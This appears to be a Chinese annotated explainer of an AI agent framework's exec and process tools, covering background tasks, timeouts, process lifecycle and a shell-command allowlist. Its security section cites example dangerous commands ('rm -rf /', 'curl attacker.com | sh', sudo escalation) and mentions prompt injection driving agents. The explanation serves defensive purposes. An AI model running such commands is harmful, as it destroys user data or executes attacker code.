# Background exec and process tool

## 架构精读

> 跳过不影响阅读翻译正文。

### exec tool + process tool——长时间运行的任务管理

OpenClaw 有两个相关工具:

**exec tool**(执行工具):
- 执行 shell 命令(如 `ls`、`cat`、`python script.py`)
- 默认是**同步**的(命令执行完才返回结果)

**process tool**(进程工具):
- 管理后台进程(如查看正在运行的进程、杀死进程)
- 用于**长时间运行**的任务(如 `npm install`、`docker build`)

**为什么需要 process tool?** 因为某些命令执行时间很长(如 `npm install` 可能需要几分钟),如果同步等待:
- Agent 被阻塞,不能响应用户的其他消息
- 用户以为 agent 挂了,重复发送消息
- 如果命令失败,用户不知道(因为还在等待)

Process tool 让 agent 把长时间运行的命令放到后台,不阻塞当前对话。Agent 可以继续响应用户,后台命令执行完后通知 agent。

**这跟 JavaScript 的 Promise/async-await 是一个思路**——同步操作会阻塞,异步操作不阻塞。OpenClaw 的 exec tool 是同步的,process tool 是异步的。

### 关键参数——控制后台进程的行为

exec tool 的关键参数:

**timeout**(超时):
- 命令执行的最大时间(如 60 秒)
- 超时后,命令被杀死,返回错误

**为什么需要 timeout?** 因为某些命令可能永远不结束(如死循环、网络超时),如果不设 timeout,进程会永远占用资源。

**background**(后台):
- `true`: 命令在后台运行,不阻塞
- `false`: 命令在前台运行,阻塞直到完成

**为什么需要 background?** 因为某些命令执行时间长(如 `docker build`),用户不想等待。Background 让命令在后台运行,agent 可以继续对话。

### 进程生命周期——内存中保持

后台进程**保持在内存中**,直到:
- 进程自然结束(命令执行完)
- 被 process tool 杀死(用户或 agent 主动终止)
- Gateway 重启(所有进程被杀死)

**为什么保持在内存中?** 因为:
- Agent 需要知道进程的状态(运行中、已结束、失败)
- Agent 需要读取进程的输出(stdout、stderr)
- 如果进程不保持在内存中,这些信息就丢失了

**这跟 Docker container 的生命周期**是一个思路——container 运行后,保持在内存中,直到被停止或删除。OpenClaw 的后台进程也是同样: 保持在内存中,直到结束或被杀死。

### process tool 的功能——查看和控制进程

process tool 提供以下功能:

**list**(列出进程):
- 显示所有正在运行的后台进程
- 包括 PID、命令、状态、运行时间

**logs**(查看日志):
- 读取进程的 stdout 和 stderr
- 实时查看输出(类似 `tail -f`)

**kill**(杀死进程):
- 终止正在运行的进程
- 用于取消长时间运行的任务

**为什么需要这些功能?** 因为后台进程不在用户视野里,用户需要工具来:
- 知道"有哪些进程在运行"(list)
- 知道"进程输出了什么"(logs)
- 控制"停止这个进程"(kill)

**这跟 `ps`、`tail`、`kill` 命令**是一个思路——Linux 用 `ps` 列出进程、`tail` 查看日志、`kill` 杀死进程。OpenClaw 的 process tool 也是同样: 提供进程管理功能。

### 安全风险——shell 命令的 allowlist

exec tool 执行的 shell 命令受 **allowlist** 控制:

```json
{
  tools: {
    allow: ["exec"],
    exec: {
      allowlist: ["ls", "cat", "grep"]
    }
  }
}
```

**为什么需要 allowlist?** 因为 shell 命令可能很危险:
- `rm -rf /` 删除所有文件
- `curl attacker.com | sh` 执行恶意脚本
- `sudo` 提权,绕过所有安全检查

Allowlist 限制 agent 只能执行允许的命令,防止恶意 prompt 注入导致危险操作。

**这跟 SELinux 的白名单策略**是一个思路——SELinux 默认拒绝所有操作,只允许白名单里的操作。OpenClaw 的 exec allowlist 也是同样: 默认拒绝所有命令,只允许白名单里的命令。
